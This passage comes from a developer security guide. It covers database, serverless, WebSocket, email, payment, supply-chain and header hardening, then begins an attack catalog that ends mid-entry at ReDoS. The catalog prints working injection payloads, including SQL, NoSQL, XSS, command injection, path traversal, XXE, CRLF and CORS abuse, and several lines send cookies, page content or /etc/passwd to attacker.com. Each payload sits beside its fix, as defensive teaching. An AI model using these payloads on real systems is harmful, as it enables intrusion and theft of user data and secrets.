// SAFE — Parameterized placeholders with sql``
const result = await db.execute(sql`
  SELECT * FROM users WHERE email = ${email}
`);

// DANGEROUS — Dynamic column names without allowlist
// const sortColumn = req.query.sort;  // Could be: "name; DROP TABLE users; --"

// SAFE — Allowlist approach
const ALLOWED = new Set(["name", "email", "created_at"]);
if (!ALLOWED.has(sortColumn)) throw new Error("Invalid column");
```

### Connection Security

Always enforce TLS for database connections in production:

```
# PostgreSQL (Neon, Supabase, self-hosted)
DATABASE_URL=postgresql://user:pass@host/db?sslmode=require&connect_timeout=10

# MySQL (PlanetScale)
DATABASE_URL=mysql://user:pass@host/db?sslaccept=strict

# Turso (libsql/SQLite over HTTP)
TURSO_DATABASE_URL=libsql://your-db.turso.io
TURSO_AUTH_TOKEN=your-auth-token
```

### Query Logging — Be Careful

Prisma and Drizzle both support query logging. In development this is useful; in production it can leak PII:

```typescript
// Prisma — log queries in development only
const prisma = new PrismaClient({
  log: process.env.NODE_ENV === "development"
    ? ["query", "info", "warn", "error"]
    : ["error"],
});

// Drizzle — custom logger
const db = drizzle(client, {
  logger: process.env.NODE_ENV === "development"
    ? true
    : false,
});
```

---

## Edge, CDN & Serverless Security

### Vercel

**Environment variables:**
- Scope variables to environments using the Vercel dashboard (`Production`, `Preview`, `Development`)
- Mark variables containing secrets as "Sensitive" — they will be redacted in build logs
- Variables starting with `NEXT_PUBLIC_` are inlined into the client JavaScript bundle at build time. Never put secrets behind this prefix.

**Source maps:**
```typescript
// next.config.ts
const nextConfig = {
  productionBrowserSourceMaps: false,
  // Also consider:
  // experimental: { serverSourceMaps: false }
};
```

Production source maps expose your full, unminified source code to anyone who opens browser devtools.

**Edge Config and KV:**
- Vercel Edge Config is for feature flags and configuration — it is not encrypted. Do not store secrets.
- Vercel KV (Upstash Redis) is suitable for rate limiting, sessions, caching — but not for raw secrets.

**WAF and Firewall:**
- Vercel provides a Web Application Firewall in the dashboard under Security. Configure custom rules for IP blocking, rate limiting, and attack mitigation.
- Enable Attack Challenge Mode for paths under active attack.

### Cloudflare Workers & Pages

```toml
# wrangler.toml — never commit secrets here
# Use `wrangler secret put MY_SECRET` for encrypted secrets

[vars]
# Non-sensitive config only:
PUBLIC_API_URL = "https://api.yourapp.com"
```

### Cold Start Attacks

An attacker can force cold starts by sending requests with unique parameters that bypass warm containers. This causes latency spikes for legitimate users and increases your serverless bill.

**Mitigation:**
- Use provisioned concurrency for latency-sensitive functions
- Set reasonable execution timeouts (5-10 seconds for APIs, not 30+)
- Monitor function duration percentiles (p50, p95, p99) in your observability platform
- Cache expensive initialization outside the handler when possible

### DDoS Mitigation

| Layer | Protection |
|-------|-----------|
| L3/L4 (Network) | Handled automatically by Vercel, Cloudflare, AWS Shield — not your concern |
| L7 (Application) | Rate limiting, WAF rules, bot detection — **you must configure these** |

For L7 protection:
- Configure Vercel WAF rate limiting rules in your project security settings
- Enable Cloudflare Bot Fight Mode or Super Bot Fight Mode
- Deploy application-level rate limiting with Upstash Ratelimit for granular per-endpoint control

---

## WebSocket & Realtime Security

### Origin Validation

WebSocket connections are not bound by the same-origin policy the way HTTP requests are. A WebSocket server that does not validate the `Origin` header can be connected to from any webpage, enabling cross-origin data theft.

```typescript
// Server-side WebSocket handler (Node.js / ws)
import { WebSocketServer } from "ws";

const wss = new WebSocketServer({ port: 8080 });

wss.on("connection", (ws, req) => {
  const origin = req.headers.origin;
  const allowedOrigins = ["https://yourapp.com", "https://www.yourapp.com"];

  if (!origin || !allowedOrigins.includes(origin)) {
    ws.close(4001, "Origin not allowed");
    return;
  }

  // Authenticate the connection
  const token = new URL(req.url!, "https://yourapp.com").searchParams.get("token");
  if (!token || !verifyToken(token)) {
    ws.close(4002, "Invalid token");
    return;
  }

  // Connection is valid — proceed
  ws.on("message", (data) => {
    // Process message...
  });
});
```

### Supabase Realtime Origin Check

Supabase Realtime validates the origin header automatically. Ensure your project's allowed origins are configured correctly in the Supabase dashboard under Authentication > URL Configuration.

### Socket.IO

```typescript
// Server
import { Server } from "socket.io";

const io = new Server(httpServer, {
  cors: {
    origin: ["https://yourapp.com"],
    methods: ["GET", "POST"],
    credentials: true,
  },
  // Require authentication for every connection
  connectionStateRecovery: {
    maxDisconnectionDuration: 2 * 60 * 1000, // 2 minutes
    skipMiddlewares: false,  // Re-verify auth on reconnection
  },
});

io.use(async (socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) return next(new Error("Authentication required"));

  try {
    const user = await verifyToken(token);
    socket.data.user = user;
    next();
  } catch {
    next(new Error("Invalid token"));
  }
});
```

### WebSocket-Specific Attack Vectors

- **Connection flooding:** An attacker opens thousands of WebSocket connections and keeps them alive. Mitigate with per-IP connection limits and authentication requirements.
- **Message amplification:** A single small client message triggers a large server response or broadcast. Validate message payloads and limit broadcast scope.
- **Session hijacking:** WebSocket connections do not automatically re-authenticate. Token expiration does not close the socket. Implement server-side session validation and periodic re-authentication.

---

## Email Security — SPF, DKIM, DMARC

If your application sends transactional emails (password resets, magic links, invoices, notifications), attackers can spoof your domain to phish your users. Three DNS records stop this.

### SPF (Sender Policy Framework)

Specifies which servers are allowed to send email from your domain.

```
# DNS TXT record for yourapp.com
v=spf1 include:_spf.google.com include:sendgrid.net include:spf.resend.com -all
```

- `include:` — delegate to your email provider's SPF records
- `-all` — hard fail: reject all other sources. Use `~all` (soft fail) during initial setup.

### DKIM (DomainKeys Identified Mail)

Cryptographically signs outgoing emails so receiving servers can verify they came from you and were not modified in transit.

Your email provider (Resend, SendGrid, Postmark, AWS SES) provides DKIM DNS records. Add them exactly as specified.

```
# Example (Resend)
resend._domainkey.yourapp.com  TXT  "v=DKIM1; p=MIGfMA0GCSqGSIb3DQEBA..."
```

### DMARC (Domain-based Message Authentication, Reporting & Conformance)

Tells receiving servers what to do when SPF or DKIM checks fail, and where to send reports.

```
# DNS TXT record for _dmarc.yourapp.com
v=DMARC1; p=reject; rua=mailto:dmarc@yourapp.com; ruf=mailto:forensic@yourapp.com; pct=100; adkim=s; aspf=s
```

- `p=reject` — reject emails that fail authentication
- `pct=100` — apply policy to 100% of emails
- `rua` — aggregate reports (daily summaries)
- `ruf` — forensic reports (per-failure details — may contain PII)
- `adkim=s; aspf=s` — strict alignment (domains must match exactly)

**Start with `p=none`** and monitor `rua` reports for a few weeks. Once you confirm legitimate email passes, move to `p=quarantine` and eventually `p=reject`.

### Testing Your Email Setup

```bash
# Check SPF, DKIM, DMARC, and more
# https://www.mail-tester.com/
# https://mxtoolbox.com/

# Send a test email and check headers in Gmail:
# View original -> Check for "SPF: PASS", "DKIM: PASS", "DMARC: PASS"
```

---

## Payment Security — Stripe, Paddle, Lemon Squeezy

### Minimizing PCI Scope

If you handle raw credit card numbers, you are in scope for PCI DSS compliance — a massive undertaking. Instead, use tokenization:

- **Stripe Elements / Checkout** — card numbers go directly to Stripe's servers; your server never sees them
- **Paddle / Lemon Squeezy** — act as a Merchant of Record, handling tax, compliance, and chargebacks
- **Never** store raw card numbers, CVCs, or full track data in your database

### Stripe Webhook Verification

Webhooks are the primary way your application learns about payment events. An unverified webhook lets an attacker simulate successful payments.

```typescript
// app/api/webhooks/stripe/route.ts
import { NextRequest, NextResponse } from "next/server";
import Stripe from "stripe";

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
  apiVersion: "2025-03-31.basil",
});

export async function POST(req: NextRequest) {
  const signature = req.headers.get("stripe-signature");
  if (!signature) {
    return NextResponse.json({ error: "Missing signature" }, { status: 400 });
  }

  let event: Stripe.Event;
  try {
    event = stripe.webhooks.constructEvent(
      await req.text(),
      signature,
      process.env.STRIPE_WEBHOOK_SECRET!
    );
  } catch (err) {
    console.error("Webhook signature verification failed");
    return NextResponse.json({ error: "Invalid signature" }, { status: 400 });
  }

  // At this point, the event is verified — Stripe sent it
  switch (event.type) {
    case "checkout.session.completed": {
      const session = event.data.object;
      // Fulfill the order — idempotency key prevents double-processing
      await fulfillOrder(session.id, session);
      break;
    }
    case "customer.subscription.deleted": {
      const subscription = event.data.object;
      await revokeAccess(subscription.customer as string);
      break;
    }
  }

  return NextResponse.json({ received: true });
}

// Idempotency — prevent double-processing if Stripe retries
async function fulfillOrder(idempotencyKey: string, session: Stripe.Checkout.Session) {
  const existing = await db.order.findUnique({
    where: { idempotencyKey },
  });
  if (existing) return existing;  // Already processed
  return db.order.create({
    data: {
      idempotencyKey,
      userId: session.client_reference_id!,
      amount: session.amount_total!,
      status: "paid",
    },
  });
}
```

### Client-Side Security

- Use `stripe.confirmCardPayment` or `stripe.confirmPayment` — never handle raw card data yourself
- Verify the client-side payment intent status on your server before granting access
- Implement `stripe.confirmPayment` with `return_url` for redirect-based payment methods

### Price Manipulation

Never trust the price from the client. Always look up the price on your server using the Stripe Price ID:

```typescript
// DANGEROUS — client sends the amount
await stripe.checkout.sessions.create({
  line_items: [{
    price_data: {
      currency: "usd",
      product_data: { name: "Custom Product" },
      unit_amount: req.body.amount,  // Attacker sends: 1 (1 cent)
    },
    quantity: 1,
  }],
});

// SAFE — look up the price on the server
const price = await stripe.prices.retrieve(req.body.priceId);
// Validate price.product matches the product the user is supposed to purchase
await stripe.checkout.sessions.create({
  line_items: [{ price: price.id, quantity: 1 }],
});
```

---

## Supply Chain — Dependencies, SBOM, CI/CD

### Dependency Auditing

Every `npm install` pulls hundreds of transitive dependencies. Any one of them can be a supply chain attack vector.

```bash
# Quick vulnerability scan
npm audit
npm audit fix

# More comprehensive: Socket.dev detects supply chain risks beyond CVEs
npx socket security

# Static analysis for security issues in your code and dependencies
npx semgrep --config=auto .

# Software composition analysis (SCA)
npx snyk test --all-projects
```

### Lockfiles

```
Commit: package-lock.json, yarn.lock, pnpm-lock.yaml, bun.lockb, composer.lock, Gemfile.lock, Cargo.lock
Ignore: NEVER — deterministic builds require lockfiles

Why lockfiles matter: Without them, CI resolves potentially different versions each run.
A compromised upstream package can be injected without touching your package.json.
```

### Dependabot / Renovate

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/New_York"
    open-pull-requests-limit: 10
    groups:
      patch-dependencies:
        update-types:
          - "patch"
    assignees:
      - "team-security"
    labels:
      - "dependencies"
      - "security"
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### CI/CD Secrets

```yaml
# .github/workflows/deploy.yml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: "npm"
      - run: npm ci
      - run: npm run build
      # Secrets are injected via the secrets context — never hardcoded
      - run: npm run deploy
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
      # DANGEROUS — never echo or log secrets
      # - run: echo "Database URL: $DATABASE_URL"  # This appears in plaintext in logs
```

### Pre-Commit Secret Scanning

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.21.0
    hooks:
      - id: gitleaks
```

```bash
# Run in CI or manually
gitleaks detect --source . --verbose
trufflehog filesystem . --no-update
```

### SBOM (Software Bill of Materials)

```bash
# Generate an SBOM for every release
npx @cyclonedx/cyclonedx-npm --output-file bom.json
# Or with Syft:
syft . -o cyclonedx-json > bom.json
```

---

## Security Headers & Browser Protections

### Production Header Set

```typescript
// next.config.ts or middleware
const securityHeaders = [
  {
    key: "Strict-Transport-Security",
    value: "max-age=63072000; includeSubDomains; preload",
  },
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob: https:",
      "font-src 'self'",
      "connect-src 'self' https://*.supabase.co https://api.stripe.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join("; "),
  },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
  { key: "Cross-Origin-Resource-Policy", value: "same-origin" },
];
```

### CORS Configuration

```typescript
const allowedOrigins = [
  "https://yourapp.com",
  "https://www.yourapp.com",
  ...(process.env.NODE_ENV === "development"
    ? ["http://localhost:3000"]
    : []),
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (server-to-server, curl, mobile apps)
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
  maxAge: 86400, // Cache preflight for 24 hours
}));
```

### Subresource Integrity (SRI)

```html
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"
  integrity="sha384-..."
  crossorigin="anonymous"></script>
```

Generate hashes with:
```bash
openssl dgst -sha384 -binary lib.js | openssl base64 -A
```

### Clear-Site-Data on Logout

```typescript
// Clear all site data on logout
return NextResponse.redirect(new URL("/", req.url), {
  headers: {
    "Clear-Site-Data": '"cache", "cookies", "storage", "executionContexts"',
  },
});
```

---

## Real-World Attack Catalog

Every attack below is actively exploited against production applications regardless of framework, language, or hosting platform. Each entry includes the vulnerable pattern, the exploitation technique, and the concrete fix.

---

### 1. SQL Injection (SQLi)

**Every stack, every language, every ORM.** SQLi happens when user input is concatenated into a SQL query string. Modern ORMs protect typed queries, but raw queries, dynamic identifiers, and stored procedures remain vulnerable.

**Classic UNION-based:**

```sql
-- VULNERABLE: /api/users?search=admin
SELECT * FROM users WHERE name = 'admin'

-- Exploit: /api/users?search=' UNION SELECT id,email,password_hash FROM users--
SELECT * FROM users WHERE name = '' UNION SELECT id,email,password_hash FROM users--'
```

**Blind boolean-based (when errors are suppressed):**

```sql
-- Probe: /api/users?id=1 AND 1=1  -> Normal response
-- Probe: /api/users?id=1 AND 1=2  -> Different response -> SQLi confirmed
-- Extract: /api/users?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
-- If response matches "true" condition, first char of password hash is 'a'
```

**Blind time-based (when responses are identical):**

```sql
-- /api/users?id=1; IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--
-- If response takes 5+ seconds, first char is 'a'. Repeat for every character.
```

**Out-of-Band (when no response is visible at all):**

```sql
-- MySQL: SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))
-- Postgres: COPY (SELECT password FROM users) TO PROGRAM 'nslookup result.attacker.com'
-- SQL Server: EXEC master..xp_dirtree '\\attacker.com\\share'
```

**Second-Order SQLi (stored then executed later):**

```typescript
// Step 1: Attacker registers with username: admin'--
await db.user.create({ data: { username: "admin'--" } });

// Step 2: Later, an admin function concatenates the stored username:
await db.$queryRawUnsafe(
  `UPDATE users SET role = 'admin' WHERE username = '${storedUsername}'`
);
// Executes: UPDATE users SET role = 'admin' WHERE username = 'admin'--'
// The '--' comments out the rest. Every user gets admin role.
```

**NoSQL variant (MongoDB):**

```javascript
// VULNERABLE: /api/login with JSON body
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password,
});

// Exploit: send { "username": "admin", "password": { "$ne": "" } }
// MongoDB query becomes: { username: "admin", password: { $ne: "" } }
// Matches any user named "admin" regardless of password

// Exploit: send { "username": { "$gt": "" }, "password": { "$gt": "" } }
// Matches the first user in the collection
```

**Defense for SQL databases:**
- Use parameterized queries / prepared statements for every query. ORMs do this for typed queries.
- Never concatenate user input into SQL strings — even with ORMs, `$queryRawUnsafe` and `DB::raw()` are dangerous.
- For dynamic identifiers (table names, column names, `ORDER BY`), validate against a strict allowlist.
- Use least-privilege database accounts — the application should not have `DROP TABLE` or `CREATE USER` grants.

**Defense for NoSQL databases:**
- Sanitize user input — strip `$` prefixed operators (`$gt`, `$ne`, `$regex`, `$where`) from user-supplied objects.
- Use typed validation: if a field expects a string, reject objects and arrays.
- Use `mongo-sanitize` (Node.js) or equivalent for your language.

---

### 2. Cross-Site Scripting (XSS)

XSS injects attacker-controlled JavaScript into pages viewed by other users. The script executes in the victim's browser with full access to that origin's cookies, localStorage, and DOM.

**Reflected XSS (immediate, via URL parameter):**

```html
<!-- VULNERABLE: /search?q=<script>alert(1)</script> -->
<h1>Results for: <?php echo $_GET['q']; ?></h1>
<!-- Renders: <h1>Results for: <script>alert(1)</script></h1> -->

<!-- Exploit payload (credential theft): -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

**Stored XSS (persistent, via database):**

```javascript
// Attacker submits a comment containing:
// <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// If the application renders comments without sanitization, every visitor
// to the page executes the attacker's script — silently.
```

**DOM-based XSS (purely client-side):**

```javascript
// VULNERABLE: /profile#<img src=x onerror=alert(1)>
const username = window.location.hash.slice(1);
document.getElementById('greeting').innerHTML = `Hello, ${username}`;
// innerHTML parses the HTML — attacker's script executes

// SAFE:
document.getElementById('greeting').textContent = `Hello, ${username}`;
```

**mXSS (mutation XSS):**

```html
<!-- Some HTML sanitizers (DOMPurify, OWASP Java HTML Sanitizer) can be bypassed
     by exploiting browser parsing mutations: -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
<!-- The browser's parser restructures this into valid HTML with an executable onerror -->
```

**Blind XSS (hits admin panels, logging dashboards, support tools):**

```javascript
// Attacker submits XSS payload as a "feedback" message or username
// The payload fires when an admin views it in an internal dashboard
// Attacker steals the admin's session token and pivots to full access

// Payload example (exfiltrate page content, not just cookies):
<script>
  var x = new XMLHttpRequest();
  x.open('POST', 'https://attacker.com/exfil');
  x.setRequestHeader('Content-Type', 'application/json');
  x.send(JSON.stringify({
    cookies: document.cookie,
    page: document.body.innerHTML,
    url: location.href,
  }));
</script>
```

**React-specific XSS:**

```jsx
// React auto-escapes JSX expressions — safe:
<div>{userInput}</div>

// But dangerouslySetInnerHTML bypasses React's escaping — dangerous:
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// href, src, and other attributes can contain javascript: URLs:
<a href={userInput}>Click me</a>
// Attacker provides: javascript:alert(1)

// Server-side rendering (Next.js): user input in <script> tags or JSON context
<script dangerouslySetInnerHTML={{ __html: `window.__DATA__ = ${JSON.stringify(data)}` }} />
// If data contains </script>, it breaks out of the script tag
```

**Defense:**
- Never use `innerHTML`, `dangerouslySetInnerHTML`, `document.write()`, or `eval()` with user data.
- Use `textContent` for text insertion. Use `DOMPurify` or `sanitize-html` for rich text.
- Set a strict Content-Security-Policy with `script-src 'self'` — this blocks inline scripts from executing.
- Use nonce-based CSP for inline scripts you control.
- Always escape output in the correct context: HTML entity encoding for HTML body, JavaScript escaping for `<script>` blocks, URL encoding for `href` attributes.
- Framework auto-escaping (React JSX, Laravel Blade `{{ }}`, Twig `{{ }}`, ERB `<%= %>`) is your default protection — never bypass it.

---

### 3. Cross-Site Request Forgery (CSRF)

CSRF forces an authenticated user's browser to make unwanted requests to your application — transferring money, changing email, deleting data — without their knowledge.

```html
<!-- Attacker hosts this on evil.com. Victim is logged into bank.com. -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
<!-- Victim visits evil.com -> browser sends POST to bank.com with victim's cookies -> money transferred -->
```

**SameSite cookie bypass:** `SameSite=Lax` blocks cross-site POST requests — but GET requests still send cookies. If your application performs state changes via GET (deletion, logout, email change), it is still vulnerable.

```http
<!-- SameSite=Lax allows GET with cookies from cross-site -->
<img src="https://bank.com/delete-account?confirm=yes">
<!-- Victim's browser loads the "image" — actually a state-changing GET request -->
```

**Login CSRF:** Attacker forces the victim to log into the attacker's account. The victim then enters sensitive data (credit card, documents) into the attacker's account. The attacker logs in and retrieves it.

**Defense:**
- **Server Actions (Next.js):** Protected automatically by the `Next-Action` header — the browser cannot set this header from a cross-origin form.
- **API routes:** Use the `Origin`/`Referer` header check; generate and validate CSRF tokens (Laravel, Express with `csurf`, or `hono/csrf`).
- **Cookies:** Set `SameSite=Strict` for sensitive operations; `SameSite=Lax` as a baseline.
- **Architecture:** Never perform state changes via GET requests. Use POST, PUT, DELETE.
- **SPA:** Store tokens in memory (not localStorage), send via `Authorization` header — cross-site forms cannot set custom headers.

---

### 4. Command Injection

When user input reaches a system command (`exec`, `system`, `popen`, `child_process.exec`, `os.system`), attackers inject additional commands using shell metacharacters.

```javascript
// VULNERABLE: /api/ping?host=8.8.8.8
const { exec } = require('child_process');
exec(`ping -c 1 ${req.query.host}`, (err, stdout) => { res.send(stdout); });

// Exploit: /api/ping?host=8.8.8.8; cat /etc/passwd
// Shell executes: ping -c 1 8.8.8.8; cat /etc/passwd

// Exploit: /api/ping?host=8.8.8.8 && curl http://attacker.com/$(cat /etc/passwd | base64)
// Blind exfiltration via DNS/HTTP when output isn't shown

// Exploit: /api/ping?host=$(cat /etc/passwd)
// Command substitution — output is passed as an argument to ping
```

**Argument injection (when the command is fixed, but arguments are user-controlled):**

```bash
# VULNERABLE: git log --oneline ${userBranch}
# Attacker provides: master --format="%H %s" --output=/tmp/evil.sh
# git interprets --output as a git flag, not a branch name

# VULNERABLE: ffmpeg -i ${userFile} output.mp4
# Attacker provides: input.mp4 -vf "fps=1" -ss 0 -t 1
# Additional ffmpeg flags that were not intended
```

**Defense:**
- Avoid calling system commands with user input. Use language-native libraries instead (e.g., `dns.lookup()` instead of `ping`, `fs.readFile()` instead of `cat`).
- If unavoidable, use `execFile`/`spawn` (Node.js) or `subprocess.run([...])` (Python) with arguments as an array — never as a shell string.
- Validate input against a strict allowlist (e.g., IP address regex, alphanumeric-only for branch names).
- Escape shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>`, `\n`.

---

### 5. Path Traversal / Directory Traversal

When user input is used to construct file paths, attackers traverse outside the intended directory using `../` sequences.

```javascript
// VULNERABLE: /api/files?name=report.pdf
const filePath = path.join('/var/www/uploads', req.query.name);
res.sendFile(filePath);

// Exploit: /api/files?name=../../../etc/passwd
// path.join resolves to: /etc/passwd
// Attacker reads any file the application process can access

// Exploit: /api/files?name=../../../app/.env
// Exposes DATABASE_URL, JWT_SECRET, API keys

// Exploit: /api/files?name=../../../proc/self/environ
// Linux: /proc/self/environ contains all process environment variables
```

**Advanced variants:**
```
../ -> ..\/ -> bypasses naive ../ filtering
....//....// -> bypasses single-pass ../ removal
..%252f -> double URL decode bypass
%2e%2e%2f -> URL-encoded ../
\x2e\x2e\x2f -> hex-encoded ../
```

**Defense:**
- Resolve the full path and verify it starts with the intended base directory:
  ```javascript
  const resolved = path.resolve('/var/www/uploads', fileName);
  if (!resolved.startsWith('/var/www/uploads')) throw new Error('Path traversal detected');
  ```
- Use a random identifier for stored files — never use user-supplied filenames for lookup.
- Store file metadata (original name, MIME type, size) in the database; look up by UUID.
- Serve files through an abstraction layer (S3 presigned URLs, Supabase Storage) that never exposes filesystem paths.

---

### 6. XXE (XML External Entity) Injection

When an XML parser processes user-supplied XML with external entity support enabled, attackers can read local files, perform SSRF, or cause denial of service.

```xml
<!-- Attacker submits this as an XML document body -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
<!-- Parser replaces &xxe; with the contents of /etc/passwd -->
```

```xml
<!-- Billion Laughs attack (exponential entity expansion) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... lol9 expands to 10^9 "lol" strings -> gigabytes of memory -->
]>
<lolz>&lol9;</lolz>
```

**Defense:**
- Disable external entity processing in your XML parser — it is the default in modern parsers, but verify:
  ```php
  // PHP
  libxml_disable_entity_loader(true);
  ```
  ```python
  # Python
  from defusedxml import ElementTree as ET  # Use defusedxml, not xml.etree
  ```
  ```javascript
  // Node.js — most XML parsers have entities disabled by default. Verify.
  ```
- If you do not need XML, do not accept it. JSON, protobuf, and MessagePack are not vulnerable to XXE.
- Set a maximum entity expansion depth and total expansion size.

---

### 7. CORS Misconfiguration Exploitation

When CORS is configured with `Access-Control-Allow-Origin: *` on endpoints that return sensitive data or accept credentials, any website can make authenticated requests to your API from the victim's browser.

```javascript
// VULNERABLE server response:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true

// Attacker's website (evil.com):
fetch('https://api.yourapp.com/user/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/exfil', { method: 'POST', body: JSON.stringify(data) }));
// The victim's browser sends their session cookie to your API.
// Because of CORS *, the browser allows evil.com to read the response.
```

**Null origin bypass:**

```javascript
// Some CORS implementations accept "null" as a valid origin
// Attacker embeds an iframe with sandbox attribute:
<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://api.yourapp.com/user/profile',{credentials:'include'}).then(r=>r.json()).then(d=>alert(JSON.stringify(d)))</script>"></iframe>
// Sandboxed iframes have origin: null
// If your server allows origin: null, the attacker reads the response
```

**Reflected Origin bypass:**

```javascript
// Server reflects the Origin header without validation:
// Access-Control-Allow-Origin: https://evil.com
// If the server echoes whatever Origin the request sends, any origin works
```

**Defense:**
- Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.
- Maintain an explicit allowlist of origins. Validate with exact string comparison.
- Do not allow `null` as a valid origin.
- Use `Vary: Origin` to prevent cache poisoning of CORS responses.

---

### 8. Host Header Injection

Applications that use `Host` header to construct URLs (password reset links, redirects, asset URLs) are vulnerable to host header poisoning.

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
...
email=victim@yourapp.com

# Server constructs the reset link using the Host header:
# https://attacker.com/reset-password?token=abc123
# Attacker receives the email, clicks the link, and gets the token
```

**Cache poisoning via Host header:**

```http
GET / HTTP/1.1
Host: attacker.com

# The cache stores the response under "attacker.com/"
# If the cache doesn't normalize Host, subsequent requests may receive
# the cached page with links pointing to attacker.com
```

**X-Forwarded-Host override:**

```http
GET / HTTP/1.1
Host: yourapp.com
X-Forwarded-Host: evil.com

# Some frameworks (Express with trust proxy, Laravel with trusted proxies)
# use X-Forwarded-Host instead of Host when behind a reverse proxy.
# If the proxy doesn't sanitize this header, the attacker controls the host.
```

**Defense:**
- Use an allowlist of valid hostnames. Reject requests where `Host` does not match.
- Configure your reverse proxy to override `X-Forwarded-Host` with the actual host.
- Generate absolute URLs using an explicitly configured `APP_URL` environment variable — never the request's `Host` header.
- Use `SERVER_NAME` instead of `HTTP_HOST` in Apache/NGINX configurations.

---

### 9. CRLF Injection / HTTP Response Splitting

When user input is placed into HTTP response headers without sanitization, attackers can inject `\r\n` (CRLF) sequences to add arbitrary headers or split the response into two.

```javascript
// VULNERABLE: /redirect?url=/dashboard
res.setHeader('Location', `/app${req.query.url}`);
res.status(302).end();

// Exploit: /redirect?url=%0d%0aSet-Cookie:%20session=attacker%0d%0a%0d%0a<script>alert(1)</script>
// URL-decoded: \r\nSet-Cookie: session=attacker\r\n\r\n<script>alert(1)</script>

// Response becomes:
HTTP/1.1 302 Found
Location: /app
Set-Cookie: session=attacker

<script>alert(1)</script>
// The browser interprets the injected Set-Cookie and renders the XSS payload
```

**Log injection via CRLF:**

```javascript
// VULNERABLE: logging user input
logger.info(`User ${username} logged in`);

// Attacker sets username to:
// admin\r\nINFO [2024-01-01] User admin performed sensitive action
// The log looks legitimate, covering attacker's tracks or framing a user
```

**Defense:**
- Strip or encode `\r` and `\n` characters from any user input before placing it in HTTP headers.
- Use framework APIs that handle escaping — `encodeURIComponent()` for URL parameters, header-specific sanitization libraries.
- Never reflect raw user input in HTTP headers. Validate against expected patterns (alphanumeric, specific format).

---

### 10. Clickjacking (UI Redress)

An attacker overlays your application in a transparent iframe on top of a malicious page. The user thinks they are clicking a button on the attacker's page, but they are actually clicking a button in your application — authorizing a payment, deleting an account, or granting permissions.

```html
<!-- Attacker's page (evil.com) -->
<style>
  .overlay {
    position: absolute;
    top: 0; left: 0;
    opacity: 0.001;  /* Nearly invisible */
    z-index: 9999;
  }
</style>

<h1>Click the button to win a free iPhone!</h1>
<button>Claim Prize</button>

<iframe class="overlay" src="https://bank.com/transfer?to=attacker&amount=10000&confirm=yes"></iframe>
<!-- The iframe's "Confirm Transfer" button is positioned exactly over the "Claim Prize" button -->
<!-- User clicks "Claim Prize" -> actually clicks "Confirm Transfer" in the transparent iframe -->
```

**Likejacking / Sharejacking:** Same technique applied to social media Like/Share buttons.

**Defense:**
- Set `X-Frame-Options: DENY` (or `SAMEORIGIN` if you have legitimate iframe use).
- CSP `frame-ancestors 'none'` is stronger and replaces `X-Frame-Options`.
- Implement frame-busting JavaScript as a secondary defense (though CSP is the primary):
  ```html
  <script>
    if (window.top !== window.self) {
      window.top.location = window.self.location;
    }
  </script>
  ```

---

### 11. Regex Denial of Service (ReDoS)

A regex with catastrophic backtracking can hang the Node.js event loop or exhaust CPU when matched against a carefully crafted input, causing a denial of service.

```javascript
// VULNERABLE: email validation regex with nested quantifiers
